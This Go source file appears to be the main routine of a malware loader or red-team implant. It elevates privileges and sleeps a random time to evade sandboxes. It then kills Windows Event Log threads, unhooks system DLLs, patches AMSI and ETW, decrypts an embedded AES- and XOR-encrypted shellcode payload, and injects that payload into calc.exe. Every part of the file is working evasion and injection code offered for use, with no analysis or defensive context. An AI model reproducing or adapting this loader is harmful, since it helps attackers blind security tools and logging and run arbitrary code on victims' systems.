package main

import (
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"encoding/hex"
	"fmt"
	"log"
	"main/utils/AMSI_EDR"
	"main/utils/BLOCKER"
	"main/utils/CleanMemory"
	"main/utils/EVENT_LOG"
	"main/utils/Indirect"
	"main/utils/Unhook"
	"main/utils/elevation"
	"math/rand"
	"time"
)

//go:embed encrypted_loader.bin
var encryptedShellcode []byte

var (
	aesKey, _    = hex.DecodeString("%KEYAES%")
	xorKey, _    = hex.DecodeString("%KEYXOR%")
	XORAESKey, _ = hex.DecodeString("%XORAESKEY%")
)

func verifyDataIntegrity(data []byte, stage string) bool {
	log.Printf("[*] Verifying data integrity at stage: %s", stage)
	if len(data) == 0 {
		log.Printf("[-] Data integrity check failed at stage: %s - Data is empty", stage)
		return false
	}
	log.Printf("[+] Data integrity check passed at stage: %s", stage)
	return true
}

func aesDecrypt(ciphertext, key []byte) ([]byte, error) {
	log.Printf("[*] Starting AES decryption - Input size: %d bytes", len(ciphertext))

	if len(key) != 16 && len(key) != 24 && len(key) != 32 {
		return nil, fmt.Errorf("[-] Invalid AES key size: %d bytes", len(key))
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("[-] AES cipher creation failed: %v", err)
		return nil, fmt.Errorf("[-] failed to create AES cipher: %v", err)
	}

	if len(ciphertext) < aes.BlockSize {
		log.Fatalf("[-] Ciphertext too short: %d bytes", len(ciphertext))
		return nil, fmt.Errorf("[-] ciphertext too short")
	}

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)

	log.Printf("[+] AES decryption completed - Output size: %d bytes", len(ciphertext))

	return ciphertext, nil
}

func xorDecrypt(data, key []byte) ([]byte, error) {
	log.Printf("[*] Starting XOR decryption - Input size: %d bytes", len(data))

	keyLen := len(key)
	if keyLen == 0 {
		log.Fatalf("[-] XOR decryption failed: empty key")
		return nil, fmt.Errorf("[-] invalid XOR key length: key cannot be empty")
	}

	for i := 0; i < len(data); i++ {
		data[i] ^= key[i%keyLen]
	}

	log.Printf("[+] XOR decryption completed - Output size: %d bytes", len(data))

	return data, nil
}

func decryptkey(data, key []byte) ([]byte, error) {
	keyLen := len(key)
	if keyLen == 0 {
		log.Fatalf("[-] XOR decryption failed: empty key")
		return nil, fmt.Errorf("[-] invalid XOR key length: key cannot be empty")
	}

	for i := 0; i < len(data); i++ {
		data[i] ^= key[i%keyLen]
	}
	return data, nil
}

func main() {
	log.SetFlags(0)

	fmt.Println("[*] elevating process")
	if err := elevation.Elevate(); err != nil {
		log.Fatalf("[-] Failed to elevate process: %v", err)
		return
	}
	fmt.Println("[+] Process elevated")

	rand.Seed(time.Now().UnixNano())
	sleepDuration := time.Duration(rand.Intn(15)+1) * time.Second
	fmt.Printf("[+] Sleeping for %v\n", sleepDuration)
	time.Sleep(sleepDuration)
	fmt.Println("[+] Woke Up ... Execution Continues")

	eventlogPid, err := EVENT_LOG.GetEventLogPid()
	if err != nil {
		log.Fatalf("[-] Failed to get Event Log PID: %v", err)
		return
	}
	log.Printf("[+] Event Log PID: %d", eventlogPid)

	err = EVENT_LOG.Phant0m(eventlogPid)
	if err != nil {
		log.Fatalf("[-] Failed to terminate Event Log threads: %v", err)
		return
	}
	log.Println("[+] Successfully terminated Event Log threads")

	fmt.Println("[*] Blocking non-Microsoft-signed DLLs")
	if err := DLLBlocker.BlockDLLs(); err != nil {
		log.Fatalf("[-] Failed to block non-Microsoft-signed DLLs: %v", err)
		return
	}
	fmt.Println("[+] Non-Microsoft-signed DLLs blocked")

	fmt.Println("[*] Unhooking DLLs")
	dllsToUnhook := []string{"ntdll.dll", "kernel32.dll", "user32.dll", "advapi32.dll", "amsi.dll"}
	if err := Unhook.FullUnhook(dllsToUnhook); err != nil {
		log.Fatalf("[-] Failed to unhook DLLs: %v", err)
		return
	}
	fmt.Println("[+] DLLs unhooked")

	log.Printf("[*] Patching Amsi And ETW")
	AMSI_EDR.ExecuteAllPatches()
	log.Printf("[+] Patched Amsi And ETW")

	DecryptedAESKEY, err := decryptkey(aesKey, XORAESKey)
	if err != nil {
		log.Fatalf("[-] Failed to decrypt AES key: %v", err)
		return
	}

	// Decode the decrypted AES key from hex
	DecryptedAESKEY, err = hex.DecodeString(string(DecryptedAESKEY))
	if err != nil {
		log.Fatalf("[-] Failed to decode AES key from hex: %v", err)
		return
	}

	fmt.Println("[+] Decrypted AES key: ", string(DecryptedAESKEY))
	defer CleanMemory.ZeroizeMemory(DecryptedAESKEY)

	DecryptedXORKEY, err := decryptkey(xorKey, XORAESKey)
	if err != nil {
		log.Fatalf("[-] Failed to decrypt XOR key: %v", err)
		return
	}

	// Decode the decrypted XOR key from hex
	DecryptedXORKEY, err = hex.DecodeString(string(DecryptedXORKEY))
	if err != nil {
		log.Fatalf("[-] Failed to decode XOR key from hex: %v", err)
		return
	}

	fmt.Println("[+] Decrypted XOR key: ", string(DecryptedXORKEY))
	defer CleanMemory.ZeroizeMemory(DecryptedXORKEY)

	if !verifyDataIntegrity(encryptedShellcode, "encrypted") {
		log.Fatalf("[-] Encrypted shellcode integrity check failed.")
		return
	}

	log.Printf("[*] Starting AES decryption")
	aesDecrypted, err := aesDecrypt(encryptedShellcode, DecryptedAESKEY)
	if err != nil {
		log.Fatalf("[-] AES decryption failed: %v", err)
		return
	}
	defer CleanMemory.ZeroizeMemory(aesDecrypted)

	log.Printf("[*] Starting XOR decryption")
	shellcode, err := xorDecrypt(aesDecrypted, DecryptedXORKEY)
	if err != nil {
		log.Fatalf("[-] XOR decryption failed: %v", err)
		return
	}
	defer CleanMemory.ZeroizeMemory(shellcode)

	if !verifyDataIntegrity(shellcode, "decrypted") {
		log.Fatalf("[-] Decrypted shellcode integrity check failed.")
		return
	}

	exePath := "C:\\Windows\\System32\\calc.exe"
	println("[*] Injecting shellcode into process: ", exePath)
	loader, err := Indirect.Init()
	if err != nil {
		log.Fatalf("[-] Failed to initialize shellcode loader: %v", err)
	}

	err = loader.InjectShellcode(shellcode, exePath)
	if err != nil {
		log.Fatalf("[-] Shellcode injection failed: %v", err)
	}
}
